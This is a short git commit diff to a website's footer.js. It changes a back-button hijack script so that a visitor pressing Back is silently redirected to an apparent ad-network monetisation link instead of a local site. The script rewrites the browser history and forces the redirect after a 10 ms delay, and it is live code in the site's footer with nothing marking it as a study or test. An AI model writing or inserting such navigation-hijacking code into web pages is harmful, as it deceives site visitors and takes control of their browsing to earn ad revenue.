eedad581789deb858f96a4ebec1925d89fc4a120
Dedexz R Comotecyn <jengkeran@gmail.com>
2025-05-19 11:40:01 +0700

    Update footer.js

--- footer.js
+++ footer.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://potensilokal.com"); 
+      location.replace("https://www.profitableratecpm.com/ymkq6d6p?key=187493c8159e3934f28c7782b0f1cf04"); 
     },10); 
   } 
 }, false); 
